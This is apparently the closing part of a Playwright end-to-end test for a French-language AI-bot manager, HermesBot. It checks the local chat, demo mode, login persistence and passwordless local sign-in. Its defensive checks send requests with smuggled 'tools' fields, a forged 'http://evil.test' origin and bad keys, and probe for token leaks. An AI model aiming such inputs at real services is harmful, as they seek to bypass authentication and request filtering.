  await page.locator('.details-panel [role=tab][aria-selected=true]', { hasText: 'Sous-agents' }).waitFor({ timeout: 3_000 }).catch(async () => {
    throw new Error(`Historique doit ouvrir l’onglet Sous-agents (${await historyTab.getAttribute('aria-selected')}).`)
  })
  const history = page.locator('.details-panel .subagent-history')
  await history.locator('.subagent-card.is-running').getByText('Comparer les offres d’hébergement').waitFor({ timeout: 2_000 })
  await history.locator('.subagent-card.is-completed').getByText('Les clients aiment la vitesse, moins le prix.').waitFor({ timeout: 2_000 })
  const auditCard = history.locator('.subagent-card', { hasText: 'Auditer les liens du site' })
  await auditCard.locator('.subagent-state.is-completed').waitFor({ timeout: 2_000 })
  await auditCard.getByText('7 appels au modèle', { exact: false }).waitFor({ timeout: 2_000 })
  await auditCard.locator('.subagent-card-head').click()
  await auditCard.locator('.subagent-prompt').getByText('Lister les liens morts, page par page.', { exact: false }).waitFor({ timeout: 2_000 })
  await auditCard.locator('.subagent-result-body strong').getByText('3', { exact: true }).waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}subagents-history.png` })
  // Everything stops: back to idle, and the open conversation is no longer read.
  delete subagentRosterByProfile.orion
  processListBySession['chat-orion'] = [{ session_id: 'proc_dev', command: 'npm run dev', status: 'exited', exit_code: 0 }]
  subagentListBySession['chat-orion'] = []
  await page.locator('.chat-identity.is-idle').waitFor({ timeout: 25_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').waitFor({ state: 'detached', timeout: 2_000 })
  // Ended without a word: it leaves the chat a few seconds later, the history keeps it.
  await history.locator('.subagent-card.is-ended').getByText('Comparer les offres d’hébergement').waitFor({ timeout: 2_000 })
  await panel.waitFor({ state: 'detached', timeout: 12_000 })
  await page.locator('.details-panel').getByRole('button', { name: 'Fermer les détails' }).click()
  const chatReads = () => backgroundCalls.filter((item) => item.method === 'process.list').length
  const readsAtRest = chatReads()
  await delay(6_000)
  if (chatReads() !== readsAtRest) throw new Error('process.list est encore lu alors que plus rien ne tourne.')
  delete processListBySession['chat-orion']
  delete subagentListBySession['chat-orion']

  const stoppedChild = new Promise((resolve) => child.once('exit', resolve))
  child.kill('SIGTERM')
  await stoppedChild
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) break } catch { /* server not ready */ }
    await delay(100)
  }
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('La session n’a pas été restaurée après redémarrage.')
  const persistedBrowser = await vaultCall('list')
  if (persistedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || persistedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le coffre CDP ne survit pas au redémarrage.')

  // Owner of the shared Chrome: the route and the roster mark it as working, even without a Hermes turn.
  if ((await fetch('http://127.0.0.1:4332/api/browser-turn')).status !== 401) throw new Error('Le propriétaire du Chrome est lisible sans session.')
  writeFileSync(BROWSER_TOUR_OWNER_FILE, 'orion')
  const browserTurn = await page.evaluate(async () => (await fetch('/api/browser-turn')).json())
  if (browserTurn.owner !== 'orion') throw new Error('Le serveur ne lit pas le propriétaire du Chrome partagé.')
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 15_000 })
  await page.locator('[data-bot=orion]').getByText('Pilote le Chrome partagé').waitFor()
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })

  // Isolated local chat: installed model only, no tools, no request to Hermes.
  if ((await fetch('http://127.0.0.1:4332/api/local-chat', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332', 'Content-Type': 'application/json' }, body: '{"messages":[{"role":"user","content":"x"}]}' })).status !== 401) throw new Error('/api/local-chat répond sans session.')
  await page.locator('[data-bot="local:ollama"]').click()
  const localBox = page.getByRole('textbox', { name: 'Message à Modèle local' })
  await localBox.waitFor({ timeout: 3_000 })
  if (await page.getByRole('button', { name: 'Ajouter des fichiers' }).count()) throw new Error('Le chat local ne doit pas accepter de fichiers.')
  if (await page.getByRole('radio', { name: 'BRAIN', exact: true }).count()) throw new Error('Le chat local ne doit pas avoir de modes.')
  if (await page.locator('.details-panel').count()) throw new Error('Pas de panneau de bot pour le chat local.')
  const promptsBeforeLocal = promptCalls
  await localBox.fill('Bonjour local')
  await localBox.press('Enter')
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 5_000 })
  if (await page.locator('.local-chat').getByText('je réfléchis').count()) throw new Error('Le raisonnement du modèle est affiché.')
  const localRequest = localChatRequests.at(-1)
  if (localRequest.model !== 'modele-local:7b' || 'tools' in localRequest || localRequest.messages.length !== 1 || localRequest.messages[0].content !== 'Bonjour local') throw new Error(`Requête locale : ${JSON.stringify(localRequest)}`)
  if (promptCalls !== promptsBeforeLocal) throw new Error('Le chat local a lancé un tour Hermes.')
  await page.screenshot({ path: `${SCREENSHOTS}local-chat.png` })
  const smuggled = await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'autre-local:1b', tools: [{ type: 'function' }], messages: [{ role: 'user', content: 'x', tools: [1] }] }) })).text())
  const smuggledRequest = localChatRequests.at(-1)
  if (!smuggled || smuggledRequest.model !== 'autre-local:1b' || 'tools' in smuggledRequest || 'tools' in smuggledRequest.messages[0]) throw new Error('Le serveur a laissé passer autre chose que les messages.')
  const requestsBeforeUnknown = localChatRequests.length
  if (await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'pas-installe', messages: [{ role: 'user', content: 'x' }] }) })).status) !== 404 || localChatRequests.length !== requestsBeforeUnknown) throw new Error('Un modèle non installé a été demandé à Ollama.')
  if (await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messages: [{ role: 'system', content: 'x' }] }) })).status) !== 400) throw new Error('Rôle system accepté.')
  // Switching to another bot keeps the local conversation.
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Message à Nova' }).waitFor({ timeout: 3_000 })
  await page.locator('[data-bot="local:ollama"]').click()
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 2_000 })
  // Missing model: clear message, no crash.
  localModelMissing = true
  await localBox.fill('Encore')
  await localBox.press('Enter')
  await page.locator('.toast').getByText('pas encore installé').waitFor({ timeout: 5_000 })
  localModelMissing = false
  await page.locator('.toast button').click()
  await page.getByRole('button', { name: 'Effacer la conversation locale' }).click()
  if (await page.locator('.local-chat .message-assistant').count()) throw new Error('Conversation locale non effacée.')
  await page.locator('[data-bot=nova]').click()

  // A truly empty list keeps its message once loading is done.
  emptyRoster = true
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.getByText('Aucun bot à afficher.').waitFor({ timeout: 15_000 })
  // A fresh Hermes: the first bot can be created from there.
  await page.getByRole('button', { name: 'Nouveau bot', exact: true }).click()
  await page.getByRole('dialog', { name: 'Nouveau bot' }).waitFor({ timeout: 3_000 })
  await page.keyboard.press('Escape')
  await page.getByRole('dialog', { name: 'Nouveau bot' }).waitFor({ state: 'detached', timeout: 2_000 })
  emptyRoster = false

  // Launch with an expired Hermes session: no login screen.
  expiredBefore = cookieCounter
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion au lancement malgré les identifiants gardés.')

  // Signing out forgets the credentials; a login without the checkbox stores nothing.
  page.once('dialog', (dialog) => dialog.accept())
  await page.getByRole('button', { name: 'Se déconnecter' }).click()
  await page.locator('.login-card').waitFor({ timeout: 10_000 })
  if (existsSync(SAVED_LOGIN_FILE) || logoutCalls !== 1) throw new Error('La déconnexion doit oublier les identifiants.')
  await page.getByLabel('Rester connecté sur ce Mac').uncheck()
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Case décochée : rien ne doit être enregistré.')

  // Demo mode: several states at once (working, done, waiting), light and dark captures.
  await page.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await page.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await page.locator('[data-bot=orion] img.live-avatar-motion').waitFor()
  await page.locator('.section-heading', { hasText: 'Atelier' }).first().waitFor({ timeout: 3_000 })
  await page.getByText('Fais-moi un point simple.').waitFor({ timeout: 3_000 })
  await delay(900)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-light.png` })
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}demo-activity.png` })
  // English interface: same demo, English system.
  // Twice the pixel density: this capture is the screenshot of the README (docs/screenshot.png).
  const english = await browser.newPage({ viewport: { width: 1280, height: 800 }, locale: 'en-US', deviceScaleFactor: 2 })
  // No animation pack, as on a fresh install: the test animations are 1×1 images and would leave blank avatars.
  await english.route('**/api/app-config', async (route) => {
    const response = await route.fetch()
    await route.fulfill({ response, json: { ...(await response.json()), animatedBots: [] } })
  })
  await english.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await english.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await english.getByRole('button', { name: 'Settings' }).waitFor({ timeout: 3_000 })
  await english.getByRole('button', { name: 'Activity', exact: true }).waitFor({ timeout: 3_000 })
  if (await english.evaluate(() => document.documentElement.lang) !== 'en') throw new Error('La langue du document doit suivre le système.')
  const frenchChrome = await english.locator('[aria-label], button').evaluateAll((nodes) => nodes.map((node) => node.getAttribute('aria-label') || node.textContent || '').filter((label) => /Réglages|Activité|Groupes|Se déconnecter|Au travail|Rechercher/.test(label)))
  if (frenchChrome.length) throw new Error(`Interface anglaise avec des libellés français : ${frenchChrome.slice(0, 5).join(' | ')}`)
  // The demo data follows the language too: sections, previews, messages and routines.
  await english.locator('.section-heading', { hasText: 'Build' }).first().waitFor({ timeout: 3_000 })
  await english.getByText('Give me a quick update.').waitFor({ timeout: 3_000 })
  await english.getByRole('button', { name: /details/i }).first().click()
  await english.getByText('Morning briefing').waitFor({ timeout: 3_000 })
  const frenchDemo = await english.locator('body').evaluate((body) => /Atelier|Maison|Lecture|Voyage|Point du matin|factures/.exec(body.innerText)?.[0] || '')
  if (frenchDemo) throw new Error(`Démo anglaise avec des données en français : ${frenchDemo}`)
  await english.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await delay(900)
  await english.screenshot({ path: `${SCREENSHOTS}demo-english.png` })
  await english.close()
  if (await page.locator('.sidebar-filter-row').evaluate((row) => row.scrollWidth > row.clientWidth)) throw new Error('La ligne de filtres déborde de la sidebar.')
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await chooseThemeInSettings('Sombre')
  await delay(700)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-dark.png` })
  await chooseThemeInSettings('Clair')
  // Demo: the bot menu works without a gateway. Pin stays local, the other actions only change the roster on screen.
  const configureBeforeDemo = configureCalls.length
  const demoRow = page.locator('[data-bot=vega]')
  const demoMenu = page.locator('.bot-menu:not(.is-sub)')
  await demoRow.click({ button: 'right' })
  await demoMenu.waitFor({ timeout: 3_000 })
  if (await demoMenu.getByRole('menuitem', { name: 'Copier l’ID de conversation' }).getAttribute('aria-disabled') !== 'true') throw new Error('Démo : un ID de conversation à copier sans conversation.')
  await demoMenu.getByRole('menuitem', { name: 'Épingler', exact: true }).click()
  await page.locator('.bot-section.is-pinned [data-bot=vega]').waitFor({ timeout: 3_000 })
  await demoRow.click({ button: 'right' })
  await demoMenu.getByRole('menuitem', { name: 'Renommer le bot' }).click()
  const demoRename = page.getByRole('dialog', { name: 'Renommer Vega' })
  await demoRename.getByRole('textbox', { name: 'Nom affiché' }).fill('Vega Bis')
  await demoRename.getByRole('button', { name: 'Renommer', exact: true }).click()
  await demoRow.locator('.bot-row-name').getByText('Vega Bis', { exact: true }).waitFor({ timeout: 3_000 })
  await demoRow.click({ button: 'right' })
  await demoMenu.getByRole('menuitem', { name: 'Supprimer', exact: true }).click()
  await page.getByRole('alertdialog').getByRole('button', { name: 'Supprimer de HermesBot' }).click()
  await demoRow.waitFor({ state: 'detached', timeout: 3_000 })
  if (await page.locator('.bot-section.is-pinned').count()) throw new Error('Démo : le bot supprimé reste épinglé.')
  if (configureCalls.length !== configureBeforeDemo) throw new Error('Démo : une action a écrit chez Hermes.')
  // Demo: a new bot without a gateway. It joins the roster, works a moment, then asks for its role; nothing goes to Hermes.
  const createsBeforeDemo = createCalls.length
  const promptsBeforeDemo = promptCalls
  await page.getByRole('button', { name: 'Nouveau bot', exact: true }).click()
  const demoNewBot = page.getByRole('dialog', { name: 'Nouveau bot' })
  await demoNewBot.getByRole('textbox', { name: 'Nom' }).fill('Pixel')
  await demoNewBot.getByRole('button', { name: 'Suivant' }).click()
  await demoNewBot.getByRole('button', { name: 'Créer' }).click()
  await demoNewBot.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('[data-bot=pixel].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.working-row').waitFor({ timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Quel rôle veux-tu me confier ?', { exact: false }).waitFor({ timeout: 6_000 })
  if (await page.locator('.message-assistant').count() !== 1) throw new Error('Démo : le nouveau bot montre une autre conversation.')
  if (createCalls.length !== createsBeforeDemo || promptCalls !== promptsBeforeDemo || configureCalls.length !== configureBeforeDemo) throw new Error('Démo : la création a parlé à Hermes.')

  // A gateway without a password, Hermes' default setup on one machine: the server signs in by itself,
  // for whoever holds its local key and for nobody else.
  localMode = true
  const stoppedForLocal = new Promise((resolve) => child.once('exit', resolve))
  child.kill('SIGTERM')
  await stoppedForLocal
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let localLog = ''
  child.stdout.on('data', (data) => { localLog += data })
  child.stderr.on('data', (data) => { localLog += data })
  for (let attempt = 0; attempt < 100 && !/\?key=/.test(localLog); attempt += 1) await delay(100)
  const localKey = /\/\?key=([A-Za-z0-9_-]{32,})/.exec(localLog)?.[1]
  if (!localKey) throw new Error(`Connexion sans mot de passe : lien absent des logs du serveur. ${localLog.slice(-400)}`)
  const localBase = 'http://127.0.0.1:4332'
  const localOptions = await (await fetch(`${localBase}/api/auth/options`)).json()
  if (localOptions.local?.available !== true) throw new Error(`Connexion sans mot de passe : ${JSON.stringify(localOptions.local)}`)

  // No key, a wrong key, a foreign origin: refused.
  localTokenSightings.length = 0
  const localPost = (headers) => fetch(`${localBase}/api/auth/local`, { method: 'POST', headers })
  const refusals = await Promise.all([
    localPost({ Origin: localBase }),
    localPost({ Origin: localBase, 'X-HermesBot-Local-Key': 'x'.repeat(43) }),
    localPost({ Origin: 'http://evil.test', 'X-HermesBot-Local-Key': localKey }),
    localPost({ 'X-HermesBot-Local-Key': localKey }),
  ])
  if (refusals.some((refusal) => refusal.status !== 403)) throw new Error(`Connexion sans mot de passe acceptée sans preuve : ${refusals.map((refusal) => refusal.status)}`)
  // Without a session of this app, no request carries the token: the server must not lend it to whoever reaches its port.
  for (const route of ['/api/auth/me', '/api/auth/providers', '/api/hermes/cron/jobs?profile=nova', '/api/hermes/analytics/usage?days=30&profile=nova', '/api/media?profile=nova&path=/tmp/image.png']) {
    const stranger = await fetch(`${localBase}${route}`)
    if ((await stranger.text()).includes(LOCAL_TOKEN)) throw new Error(`Jeton local dans la réponse de ${route}.`)
  }
  const strangerSocket = await new Promise((resolve) => {
    const socket = new WebSocket(`ws://127.0.0.1:4332/api/ws?profile=default`, 'hermes-gateway-v1', { headers: { Origin: localBase } })
    socket.on('open', () => { socket.close(); resolve('open') })
    socket.on('unexpected-response', (_request, response) => resolve(response.statusCode))
    socket.on('error', () => resolve('error'))
  })
  if (strangerSocket === 'open') throw new Error('WebSocket ouvert sans session locale.')
  if (localTokenSightings.length || localTickets) throw new Error(`Jeton local envoyé sans session : ${localTokenSightings.join(', ')}`)

  // With the key: a session, and the token stays on the server side.
  const localSignIn = await localPost({ Origin: localBase, 'X-HermesBot-Local-Key': localKey })
  const localCookie = (localSignIn.headers.getSetCookie()[0] || '').split(';')[0]
  if (localSignIn.status !== 200 || !localCookie.startsWith('hermesbot_session=') || (await localSignIn.text()).includes(LOCAL_TOKEN)) {
    throw new Error(`Connexion sans mot de passe refusée avec la clé : ${localSignIn.status}`)
  }
  const localMe = await fetch(`${localBase}/api/auth/me`, { headers: { cookie: localCookie } })
  const localMeText = await localMe.text()
  if (localMe.status !== 200 || !localMeText.includes('loopback') || localMeText.includes(LOCAL_TOKEN)) throw new Error(`Session sans mot de passe : ${localMe.status}`)
  if (!localTokenSightings.includes('/api/auth/me')) throw new Error('La session sans mot de passe n’a pas présenté le jeton à la gateway.')
  // Vault writes keep asking for a password session: a bot of the same account can read the token file.
  const localVault = await fetch(`${localBase}/api/browser-vault/entries/remove`, {
    method: 'POST', headers: { cookie: localCookie, Origin: localBase, 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'none' }),
  })
  if (localVault.status !== 401 && localVault.status !== 403) throw new Error(`Coffre ouvert en écriture à une session sans mot de passe : ${localVault.status}`)

  // In a browser: the sign-in link opens the bots with no form, and the key leaves the address bar.
  const localContext = await browser.newContext()
  const localPage = await localContext.newPage()
  await localPage.goto(`${localBase}/?key=${localKey}`)
  await localPage.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await localPage.locator('.login-card').count()) throw new Error('Formulaire affiché malgré le lien de connexion.')
  if (new URL(localPage.url()).search) throw new Error('La clé locale reste dans la barre d’adresse.')
  if (!localTickets || localSocketOrigins.some(Boolean)) throw new Error(`Socket sans mot de passe : ${localTickets} ticket(s), Origin « ${localSocketOrigins.join(', ')} ».`)
  if ((await localPage.content()).includes(LOCAL_TOKEN) || localLog.includes(LOCAL_TOKEN)) throw new Error('Jeton local visible dans la page ou dans les logs.')
  await localContext.close()
  // Without the key, a browser gets an explanation, not a password form that cannot work.
  const strangerContext = await browser.newContext()
  const strangerPage = await strangerContext.newPage()
  await strangerPage.goto(localBase)
  await strangerPage.locator('.login-local').waitFor({ timeout: 15_000 })
  if (await strangerPage.locator('input[type=password]').count()) throw new Error('Formulaire de mot de passe proposé à une gateway sans mot de passe.')
  await strangerContext.close()
  localMode = false

  if (errors.length) throw new Error(`Erreurs Chromium: ${errors.join(', ')}`)
  console.log('E2E OK: connexion sans mot de passe (clé locale, jeton jamais prêté), auth, WebSocket, roster, routines réelles, cache instantané, médias MEDIA: (galerie, vidéo Range, visionneuse, filtres, vidéo livrée avec la réponse), statut au travail et tour en arrière-plan, statut en veille et panneau sous-agents (subagent.roster, process.list, subagent.list, subagent.tail, événements subagent.*), NOREPLY jamais affiché en streaming, étapes du bot repliées dans la ligne de travail (un seul message par tour), /model, contexte, tok/s, envoi, streaming, scroll libre, coupure 1006 et reconnexion, bouton de reconnexion (socket unique, réabonnement, gateway injoignable, session expirée), classement par groupes ou par activité, menu clic droit des bots (épingler, déplacer avec révision, nouvelle section, renommer, marquer lu, copier l’ID, masquer, suppression réversible, démo), nouveau bot (nom, apparence, profiles.create, fiche, premier tour unique hors du fil, démo), thème dans les réglages seulement, résumé du travail sans non-lu avant la fin, coffre gateway et accords, coffre CDP dans le trousseau (save, list, fill, code, bots autorisés, réglages, refus d’origine, journal sans secret, persistance), carte de mail, identifiants gardés, mentions @bot, glisser-déposer, documents en onglets (HTML isolé), onglet Usage, onglet Médias, message pendant le travail, raccourcis, modes BRAIN, PLAN et EXEC, mode caveman, écrans de chargement.')
} finally {
  if (browser) await browser.close()
  if (child) child.kill('SIGTERM')
  localControl.close()
  if (vaultService) vaultService.kill('SIGTERM')
  await execFileAsync('/usr/bin/security', ['delete-keychain', BROWSER_VAULT_KEYCHAIN]).catch(() => undefined)
  rmSync(BROWSER_VAULT_KEYCHAIN, { force: true })
  rmSync(BROWSER_VAULT_TOKEN, { force: true })
  wss.close()
  cdpWss.close()
  await new Promise((resolve) => mock.close(resolve))
  await new Promise((resolve) => cdpMock.close(resolve))
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
  rmSync(BROWSER_TOUR_FIXTURE, { force: true })
  rmSync(TEST_DATA, { recursive: true, force: true })
}
